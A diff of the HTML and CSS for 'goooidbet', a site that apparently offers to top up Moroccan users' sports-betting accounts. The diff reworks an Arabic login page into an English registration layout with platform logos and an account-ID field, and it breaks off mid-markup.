@@ -1,393 +1,1364 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  
-  <!-- أيقونة الموقع -->
-  <link rel="icon" type="image/png" href="https://i.ibb.co/ynGLnswv/8-BC7966-F-FF87-4-D5-B-9-B8-E-0103810-AB7-B8.png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- أيقونة الموقع -->
+    <link rel="icon" type="image/png" href="https://i.ibb.co/ynGLnswv/8-BC7966-F-FF87-4-D5-B-9-B8-E-0103810-AB7-B8.png">
 
-  <!-- عنوان الموقع الاحترافي لمحركات البحث -->
-  <title>goooidbet | الوكيل الرسمي والأضمن لشحن 1xBet، Melbet، LineBet و MegaPari في المغرب</title>
-  
-  <!-- وصف احترافي ضخم موجه لمحركات البحث والذكاء الاصطناعي لضمان الصدارة الثقة والسرعة -->
-  <meta name="description" content="إليك goooidbet المنصة الأولى والأكثر ثقة في المغرب لشحن وتعبئة حسابات الرهان الرياضي (1xBet، Melbet، LineBet، MegaPari، Gooobet) فورياً برقم الـ ID وبدون أي اقتطاعات. نضمن لك سرعة فائقة في المعاملات، أمان تام، ودعم متواصل على مدار الساعة عبر البنوك المغربية ووسائل الدفع المحلية." />
-  
-  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet" />
-  <style>
-    :root {
-      --header-height: 60px;
-      --idbet-color: #e50914;
-    }
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Tajawal', sans-serif;
-      background: #f5f5f5;
-      color: #333;
-    }
-    header {
-      height: var(--header-height);
-      background: #fff;
-      display: flex;
-      align-items: center;
-      padding: 0 16px;
-      box-shadow: 0 1px 4px rgba(0, 0, 0, .05);
-      border-bottom: 1px solid #eee;
-    }
-    .header-brand {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-weight: 500;
-    }
-    .idbet {
-      color: var(--idbet-color);
-      font-size: 1.1rem;
-      font-weight: bold;
-    }
-    .separator {
-      color: #ccc;
-    }
-    .slogan {
-      color: #555;
-      font-size: .9rem;
-    }
-    main {
-      display: flex;
-      justify-content: center;
-      padding: 24px 12px;
-    }
-    .login-box {
-      background: #fff;
-      padding: 28px 20px;
-      max-width: 400px;
-      width: 100%;
-      border-radius: 14px;
-      box-shadow: 0 6px 20px rgba(0, 0, 0, .06);
-    }
-    .title-wrapper {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 1.3rem;
-      font-weight: bold;
-      margin-bottom: 16px;
-      color: #222;
-    }
-    .step-box {
-      width: 32px;
-      height: 32px;
-      background: var(--idbet-color);
-      color: #fff;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .input-label {
-      margin-bottom: 6px;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-    }
-    .info-icon {
-      width: 20px;
-      height: 20px;
-      border: 2px solid #666;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.95rem;
-      cursor: help;
-      color: #666;
-      transition: all 0.3s ease;
-    }
-    .info-icon:hover {
-      border-color: var(--idbet-color);
-      background: rgba(229, 9, 20, 0.08);
-      color: var(--idbet-color);
-    }
-    .input-group {
-      margin-bottom: 12px;
-    }
-    .input-wrapper {
-      position: relative;
-    }
-    .input-wrapper input {
-      width: 100%;
-      padding: 8px;
-      font-size: 0.95rem;
-      border: 1px solid #bbb;
-      border-radius: 6px;
-      outline: none;
-      padding-left: 40px;
-    }
-    .status-icon {
-      position: absolute;
-      left: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-      display: none;
-      align-items: center;
-      justify-content: center;
-    }
-    .status-spinner {
-      border: 2px solid #ccc;
-      border-top: 2px solid var(--idbet-color);
-      animation: spin 0.8s linear infinite;
-    }
-    .status-check {
-      background: #28a745;
-      color: white;
-      font-size: 12px;
-    }
-    .error-message {
-      font-size: 0.8rem;
-      margin-top: 4px;
-      min-height: 18px;
-      text-align: center;
-      color: #d32f2f;
-    }
-    .platform-icons {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin: 16px 0 18px;
-    }
-    .icon {
-      position: relative;
-      width: 85px;
-      height: 85px;
-      border-radius: 12px;
-      background: #fff;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, .04);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 8px;
-      border: 1px solid #eee;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    .icon:hover {
-      background-color: #fafafa;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, .08);
-    }
-    .icon.selected {
-      border-color: var(--idbet-color);
-      box-shadow: 0 0 8px rgba(229, 9, 20, .3);
-    }
-    .icon.selected::after {
-      content: "✓";
-      position: absolute;
-      top: 5px;
-      left: 5px;
-      width: 18px;
-      height: 18px;
-      background: var(--idbet-color);
-      color: #fff;
-      border-radius: 50%;
-      font-size: 11px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .icon img {
-      height: 40px;
-      max-width: 80%;
-      object-fit: contain;
-    }
-    .icon-name {
-      margin-top: 6px;
-      font-size: 0.8rem;
-      color: #222;
-      text-align: center;
-    }
-    .login-btn {
-      background: var(--idbet-color);
-      color: #fff;
-      font-weight: bold;
-      border: none;
-      padding: 10px 12px;
-      width: 100%;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      font-size: 1rem;
-    }
-    .login-btn:disabled {
-      background: #ccc;
-      cursor: not-allowed;
-    }
-    .login-btn:hover:not(:disabled) {
-      background: #b20710;
-    }
-    .login-btn:active:not(:disabled) {
-      transform: scale(0.98);
-    }
-    .btn-spinner {
-      width: 16px;
-      height: 16px;
-      border: 2px solid rgba(255, 255, 255, .6);
-      border-top: 2px solid #fff;
-      border-radius: 50%;
-      display: inline-block;
-      animation: spin 0.8s linear infinite;
-      margin-right: 5px;
-      vertical-align: middle;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-  </style>
+    <!-- عنوان الموقع الاحترافي لمحركات البحث -->
+    <title>goooidbet | الوكيل الرسمي والأضمن لشحن 1xBet، Melbet، LineBet و MegaPari في المغرب</title>
+    
+    <!-- وصف احترافي لمحركات البحث والذكاء الاصطناعي -->
+    <meta name="description" content="إليك goooidbet المنصة الأولى والأكثر ثقة في المغرب لشحن وتعبئة حسابات الرهان الرياضي (1xBet، Melbet، LineBet، MegaPari، Gooobet) فورياً برقم الـ ID وبدون أي اقتطاعات. نضمن لك سرعة فائقة في المعاملات، أمان تام، ودعم متواصل على مدار الساعة." />
+
+    <!-- Google Font: Roboto -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background-color: #1a2332;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding-top: 56px;
+        }
+
+        /* دعم اتجاه اللغة RTL تلقائياً */
+        [dir="rtl"] {
+            text-align: right;
+        }
+        [dir="rtl"] .left-section, [dir="rtl"] .right-section {
+            direction: rtl;
+        }
+        [dir="rtl"] .select-group::after {
+            right: auto;
+            left: 15px;
+        }
+        [dir="rtl"] .select-field {
+            text-align: right;
+            padding: 14px 15px 8px 15px;
+        }
+        [dir="rtl"] .select-label-top {
+            left: auto;
+            right: 15px;
+        }
+        [dir="rtl"] .lang-search-input {
+            padding: 10px 38px 10px 15px;
+        }
+        [dir="rtl"] .lang-search-wrapper i {
+            left: auto;
+            right: 14px;
+        }
+        [dir="rtl"] .lang-flag {
+            margin-right: 0;
+            margin-left: 15px;
+        }
+        [dir="rtl"] .lang-code {
+            margin-right: 0;
+            margin-left: 15px;
+        }
+        [dir="rtl"] .lang-divider {
+            margin-right: 0;
+            margin-left: 15px;
+        }
+        [dir="rtl"] .support-info {
+            text-align: right;
+        }
+        [dir="rtl"] .app-banner {
+            direction: rtl;
+        }
+        [dir="rtl"] .input-field {
+            text-align: right;
+        }
+
+        /* ----- Base Header Style ----- */
+        .header-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: #202d3d;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            width: 100%;
+            height: 56px;
+            border-bottom: 1px solid #2a3a4e;
+            z-index: 1000;
+        }
+
+        .left-section, .right-section {
+            display: flex;
+            align-items: center;
+        }
+
+        .left-section { gap: 8px; }
+        .right-section { gap: 6px; }
+
+        .gooo-logo {
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: -0.8px;
+            line-height: 1;
+            white-space: nowrap;
+        }
+        .gooo-logo .part-gooo { color: #2fb5f3; }
+        .gooo-logo .part-idbet { color: #ffffff; }
+
+        .flag-skew {
+            width: 24px;
+            height: 16px;
+            background-color: #c8102e;
+            transform: skewX(-12deg);
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .flag-star {
+            width: 9px;
+            height: 9px;
+            transform: skewX(12deg);
+        }
+
+        /* Buttons Style */
+        .gift-btn {
+            position: relative;
+            width: 38px;
+            height: 38px;
+            background-color: #2b5278;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            flex-shrink: 0;
+            border: none;
+            cursor: pointer;
+        }
+
+        .gift-icon {
+            width: 22px;
+            height: 20px;
+            position: relative;
+        }
+
+        .gift-lid {
+            width: 22px;
+            height: 5px;
+            background-color: #ffffff;
+            border-radius: 2px;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .gift-bow {
+            position: absolute;
+            top: -4px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 10px;
+            height: 4px;
+            border: 1.5px solid #ffffff;
+            border-bottom: none;
+            border-radius: 5px 5px 0 0;
+        }
+
+        .gift-box {
+            width: 18px;
+            height: 14px;
+            background-color: #ffffff;
+            border-radius: 0 0 2px 2px;
+            position: absolute;
+            bottom: 0;
+            left: 2px;
+        }
+
+        .gift-ribbon {
+            width: 4px;
+            height: 100%;
+            background-color: #2b5278;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            top: 0;
+        }
+
+        .gift-badge {
+            position: absolute;
+            top: -3px;
+            right: -3px;
+            background-color: #8cc63f;
+            color: #ffffff;
+            font-size: 10px;
+            font-weight: 700;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+
+        .btn-login {
+            background-color: #2b5278;
+            color: #ffffff;
+            text-decoration: none;
+            height: 38px;
+            padding: 0 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            white-space: nowrap;
+        }
+
+        .btn-register, .btn-deposit {
+            background-color: #a3cc76;
+            color: #ffffff;
+            text-decoration: none;
+            height: 38px;
+            padding: 0 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            white-space: nowrap;
+        }
+
+        .user-btn {
+            position: relative;
+            width: 38px;
+            height: 38px;
+            background-color: #2b5278;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            flex-shrink: 0;
+            color: #ffffff;
+            font-size: 16px;
+        }
+
+        .user-badge-dot {
+            position: absolute;
+            top: 4px;
+            right: 4px;
+            width: 8px;
+            height: 8px;
+            background-color: #ff3b30;
+            border-radius: 50%;
+        }
+
+        .header-variant { display: none; }
+        .header-variant.active { display: flex; }
+
+        /* ----- App Container Style ----- */
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background-color: #17212e;
+            display: flex;
+            flex-direction: column;
+            min-height: calc(100vh - 56px);
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        .title-bar {
+            background-color: #202d3d;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #2a3a4e;
+        }
+
+        .title-bar h2 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .back-btn {
+            background-color: #2b5278;
+            color: #fff;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .content-card {
+            background-color: #eef2f5;
+            color: #333;
+            margin: 15px;
+            border-radius: 12px;
+            padding: 15px;
+        }
+
+        /* TABS DESIGN */
+        .tabs {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .tab-icon-box {
+            width: 100%;
+            height: 52px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.03);
+            margin-bottom: 8px;
+            transition: all 0.2s ease;
+        }
+
+        .tab-icon-box svg {
+            width: 22px;
+            height: 22px;
+            fill: #2b629d;
+            transition: fill 0.2s ease;
+        }
+
+        .tab-item.active .tab-icon-box {
+            background-color: #2b629d;
+        }
+
+        .tab-item.active .tab-icon-box svg {
+            fill: #ffffff;
+        }
+
+        .tab-label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #2b629d;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid #d1d5db;
+            background-color: #ffffff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        /* Partners Grid Design with Images Integration */
+        .partners-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .partner-card {
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 10px 5px;
+            text-align: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.2s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .partner-card.selected {
+            border-color: #2b629d;
+            background-color: #f0f4f8;
+            box-shadow: 0 0 8px rgba(43, 98, 157, 0.3);
+        }
+
+        .partner-card img {
+            height: 36px;
+            max-width: 80%;
+            object-fit: contain;
+            margin-bottom: 4px;
+        }
+
+        .partner-card span {
+            font-size: 11px;
+            color: #444;
+            font-weight: 600;
+        }
+
+        .select-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .select-field {
+            width: 100%;
+            padding: 14px 15px 8px 15px;
+            border-radius: 8px;
+            border: 1px solid #d1d5db;
+            background-color: #ffffff;
+            font-size: 14px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            color: #2b629d;
+            font-weight: 500;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .select-label-top {
+            position: absolute;
+            top: 6px;
+            left: 15px;
+            font-size: 10px;
+            color: #666;
+            pointer-events: none;
+            font-weight: 400;
+        }
+
+        .select-group::after {
+            content: '\f107';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #2b629d;
+            pointer-events: none;
+            font-size: 14px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #a3cc76;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: background 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #92b868;
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .terms-text {
+            font-size: 11px;
+            color: #666;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .terms-text a {
+            color: #2b629d;
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding: 15px;
+            font-size: 11px;
+            color: #8a9cb0;
+            text-align: center;
+        }
+
+        .footer-desc {
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .footer-desc a {
+            color: #3b82f6;
+            text-decoration: underline;
+        }
+
+        .copyright {
+            margin-bottom: 15px;
+            color: #a0aec0;
+        }
+
+        .bottom-actions {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .action-btn {
+            flex: 1;
+            background-color: #244163;
+            border: 1px solid #31547f;
+            border-radius: 8px;
+            padding: 10px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .support-btn {
+            flex: 2;
+        }
+
+        .support-info {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        .support-info span:first-child {
+            font-weight: 700;
+            font-size: 13px;
+        }
+
+        .support-info span:last-child {
+            font-size: 10px;
+            color: #a0aec0;
+        }
+
+        .app-banner {
+            background: linear-gradient(135deg, #1d6aa3, #154973);
+            border-radius: 8px;
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: #fff;
+        }
+
+        .app-title {
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: -0.8px;
+            line-height: 1;
+        }
+        .app-title .part-gooo { color: #2fb5f3; }
+        .app-title .part-idbet { color: #ffffff; }
+
+        .app-icons {
+            display: flex;
+            gap: 12px;
+            font-size: 18px;
+        }
+
+        /* Language Modal Overlay Styles */
+        .lang-modal {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #17212e;
+            z-index: 999;
+            flex-direction: column;
+        }
+
+        .lang-modal.open {
+            display: flex;
+        }
+
+        .lang-header {
+            background-color: #202d3d;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #2a3a4e;
+        }
+
+        .lang-header h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .lang-search-box {
+            padding: 15px 15px 5px 15px;
+            background-color: #17212e;
+        }
+
+        .lang-search-input {
+            width: 100%;
+            padding: 10px 15px 10px 38px;
+            border-radius: 8px;
+            border: 1px solid #2a3a4e;
+            background-color: #202d3d;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .lang-search-wrapper {
+            position: relative;
+        }
+
+        .lang-search-wrapper i {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8a9cb0;
+            font-size: 14px;
+        }
+
+        .lang-list {
+            padding: 10px 15px 15px 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            overflow-y: auto;
+        }
+
+        .lang-item {
+            background-color: #202d3d;
+            padding: 12px 15px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            color: #fff;
+            font-size: 14px;
+            border: 1px solid #2a3a4e;
+        }
+
+        .lang-item:hover {
+            background-color: #2b415e;
+        }
+
+        .lang-flag {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 15px;
+            flex-shrink: 0;
+            box-shadow: 0 0 2px rgba(0,0,0,0.5);
+        }
+
+        .lang-code {
+            color: #8a9cb0;
+            font-weight: 500;
+            width: 35px;
+            margin-right: 15px;
+        }
+
+        .lang-divider {
+            color: #2a3a4e;
+            margin-right: 15px;
+        }
+
+        .lang-name {
+            color: #fff;
+            font-weight: 400;
+        }
+
+        /* Popup Modal Styles */
+        .gift-popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.75);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .gift-popup-overlay.open {
+            display: flex;
+        }
+
+        .gift-popup-card {
+            background: linear-gradient(145deg, #202d3d, #17212e);
+            border: 1px solid #2a3a4e;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 380px;
+            padding: 25px 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+            animation: popupScale 0.3s ease;
+        }
+
+        @keyframes popupScale {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .gift-popup-icon {
+            width: 64px;
+            height: 64px;
+            background-color: rgba(140, 198, 63, 0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px auto;
+            color: #8cc63f;
+            font-size: 28px;
+            box-shadow: 0 0 15px rgba(140, 198, 63, 0.2);
+        }
+
+        .gift-popup-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 10px;
+        }
+
+        .gift-popup-desc {
+            font-size: 14px;
+            color: #8a9cb0;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .gift-popup-desc strong {
+            color: #8cc63f;
+        }
+
+        .gift-popup-btn {
+            background-color: #8cc63f;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .gift-popup-btn:hover {
+            background-color: #7db335;
+        }
+    </style>
 </head>
 <body>
 
-<header>
-  <div class="header-brand">
-    <span class="idbet">idbet</span><span class="separator">|</span><span class="slogan">وكيل شحن</span>
-  </div>
-</header>
-<main>
-  <section class="login-box">
-    <div class="title-wrapper">
-      <div class="step-box">
-        <svg viewBox="0 0 32 32" width="20" height="20" fill="white" xmlns="http://www.w3.org/2000/svg">
-          <path d="M28 18.7c-.5-3.8-2-7.5-4.6-10.4C21.6 6 20 3.8 20 .7a.7.7 0 00-1-.6 17 17 0 00-6.3 9c-.5 2.3-.7 4.6-.7 6.8-2.7-.6-3.3-4.6-3.3-4.7a.7.7 0 00-1-.5c-.1.1-3.5 1.8-3.7 8.6v.7a12 12 0 0012 12 12 12 0 0012-13.3zm-12 12a4.1 4.1 0 01-4-4.3V26c0-.7.1-1.4.4-2a2.4 2.4 0 002.2 1.5.7.7 0 00.7-.6c0-1 0-2 .2-3 .3-1 .8-1.9 1.4-2.6.3.9.8 1.7 1.4 2.5 1 1.2 1.5 2.6 1.7 4.1v.4a4.1 4.1 0 01-4 4.3z"/>
-        </svg>
-      </div>
-      <h2>تسجيل الدخول</h2>
+    <!-- الهيدر الأول (الافتراضي) -->
+    <header id="header-main" class="header-bar header-variant active">
+        <div class="left-section">
+            <a href="#" class="gooo-logo">
+                <span class="part-gooo">gooo</span><span class="part-idbet">idbet</span>
+            </a>
+            <div class="flag-skew">
+                <svg class="flag-star" viewBox="0 0 100 100">
+                    <polygon points="50,5 64,36 98,36 70,57 81,91 50,70 19,91 30,57 2,36 36,36" fill="none" stroke="#006233" stroke-width="8"/>
+                </svg>
+            </div>
+        </div>
+        <div class="right-section">
+            <button type="button" class="gift-btn" id="giftBtnMain" aria-label="Bonus">
+                <div class="gift-icon">
+                    <div class="gift-bow"></div>
+                    <div class="gift-lid"></div>
+                    <div class="gift-box"><div class="gift-ribbon"></div></div>
+                </div>
+                <span class="gift-badge">1</span>
+            </button>
+            <a href="#" class="btn-login" data-i18n="loginBtn">Log in</a>
+            <a href="#" class="btn-register" data-i18n="registerHeaderBtn">Registration</a>
+        </div>
+    </header>
+
+    <!-- الهيدر الثاني (بعد التسجيل) -->
+    <header id="header-register" class="header-bar header-variant">
+        <div class="left-section">
+            <a href="#" class="gooo-logo">
+                <span class="part-gooo">gooo</span><span class="part-idbet">idbet</span>
+            </a>
+            <div class="flag-skew">
+                <svg class="flag-star" viewBox="0 0 100 100">
+                    <polygon points="50,5 64,36 98,36 70,57 81,91 50,70 19,91 30,57 2,36 36,36" fill="none" stroke="#006233" stroke-width="8"/>
+                </svg>
+            </div>
+        </div>
+        <div class="right-section">
+            <button type="button" class="gift-btn" id="giftBtnRegister" aria-label="Bonus">
+                <div class="gift-icon">
+                    <div class="gift-bow"></div>
+                    <div class="gift-lid"></div>
+                    <div class="gift-box"><div class="gift-ribbon"></div></div>
+                </div>
+                <span class="gift-badge">1</span>
+            </button>
+            <a href="/deposit" class="btn-deposit" data-i18n="depositBtn">Deposit</a>
+            <a href="/profile" class="user-btn" aria-label="Profile">
+                <i class="fa-solid fa-user"></i>
+                <span class="user-badge-dot"></span>
+            </a>
+        </div>
+    </header>
+
+    <!-- محتوى الصفحة -->
+    <div class="app-container">
+        <div class="title-bar">
+            <button class="back-btn"><i class="fa-solid fa-arrow-left"></i></button>
+            <h2 id="pageTitle" data-i18n="pageTitle">Registration</h2>
+        </div>
+
+        <div class="content-card">
+            <!-- TABS -->
+            <div class="tabs">
+                <div class="tab-item active">
+                    <div class="tab-icon-box">
+                        <svg viewBox="0 0 11 15"><path d="M10 5.5l-.2-.1H6.6L9.8 1V.8H4.9l-4 7v.3h3l-3 6.3v.3h.4l8.7-9c.1 0 .1-.1 0-.2z"></path></svg>
+                    </div>
+                    <span class="tab-label" data-i18n="oneClick">One-click</span>
+                </div>
+
+                <div class="tab-item">
+                    <div class="tab-icon-box">
+                        <svg viewBox="0 0 32 32"><path d="M19.3 7.3c1.5.9 2.6 2.4 2.8 4.3.6.3 1.2.5 2 .5a4.7 4.7 0 000-9.3c-2.7-.1-4.8 2-4.8 4.5zm-3 9.6c2.6 0 4.6-2.2 4.6-4.7s-2.1-4.7-4.6-4.7-4.7 2.2-4.7 4.7 2 4.7 4.7 4.7zm1.9.3h-4a6 6 0 00-6 6v5h.3c3.2 1 6 1.4 8.2 1.4 4.4 0 7-1.3 7.2-1.3l.3-.2v-4.8a6 6 0 00-6-6.1zm7.8-4.8h-4c0 1.6-.7 3-1.7 4 2.9.9 5 3.6 5 6.9v1.5c4-.1 6.2-1.3 6.3-1.3l.3-.2h.1v-4.8a6 6 0 00-6-6.1zm-18-.3c1 0 1.8-.3 2.5-.8.2-1.5 1-2.8 2.2-3.7v-.3a4.7 4.7 0 00-9.3 0c0 2.6 2 4.8 4.6 4.8zm4.2 4.3c-1-1-1.7-2.5-1.8-4H6a6 6 0 00-6 6v5h.3c2.6.9 4.8 1.2 6.8 1.3v-1.4c0-3.3 2.2-6 5.1-6.9z"></path></svg>
+                    </div>
+                    <span class="tab-label" data-i18n="socialNetworks">Social networks</span>
+                </div>
+
+                <div class="tab-item">
+                    <div class="tab-icon-box">
+                        <svg viewBox="0 0 32 32"><path d="M16 20.7l-4-3.5L.8 26.9c.4.4 1 .6 1.6.6h27.4c.6 0 1.2-.2 1.6-.6L20 17.2l-4 3.5z"></path><path d="M31.3 5.3c-.4-.4-1-.6-1.6-.6H2.3c-.6 0-1.2.2-1.6.6L16 18.4 31.3 5.3zM0 6.7v19l11-9.4zM21 16.3l11 9.4v-19z"></path></svg>
+                    </div>
+                    <span class="tab-label" data-i18n="byEmail">By e-mail</span>
+                </div>
+
+                <div class="tab-item">
+                    <div class="tab-icon-box">
+                        <svg viewBox="0 0 10 15"><path d="M8.7.7h-7C1 .7.4 1.1.4 1.7v12c0 .6.5 1 1.1 1h7.1c.6 0 1.1-.4 1.1-1v-12c0-.6-.5-1-1-1zM4 1.4h2.3l.1.1v.1H4v-.2zm1.2 12.8c-.3 0-.6-.2-.6-.4 0-.3.3-.5.6-.5s.5.2.5.5c0 .2-.2.4-.5.4zM9 13H1.3V2.2H9V13z"></path></svg>
+                    </div>
+                    <span class="tab-label" data-i18n="byPhone">By phone</span>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <input type="text" class="input-field" id="idCompteInput" placeholder="ID Compte" maxlength="15" data-i18n-placeholder="idPlaceholder">
+            </div>
+
+            <!-- المنصات بالصور والروابط المدمجة -->
+            <div class="partners-grid" id="platforms">
+                <div class="partner-card" data-name="LineBet">
+                    <img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" alt="LineBet">
+                    <span>LineBet</span>
+                </div>
+                <div class="partner-card" data-name="MegaPari">
+                    <img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" alt="MegaPari">
+                    <span>MegaPari</span>
+                </div>
+                <div class="partner-card" data-name="Melbet">
+                    <img src="https://i.postimg.cc/wjCr86FS/melbet.png" alt="Melbet">
+                    <span>Melbet</span>
+                </div>
+                <div class="partner-card" data-name="Gooobet">
+                    <img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" alt="Gooobet">
+                    <span>Gooobet</span>
+                </div>
+                <div class="partner-card" data-name="1xBet">
+                    <img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" alt="1xBet">
+                    <span>1xBet</span>
+                </div>
+            </div>
+
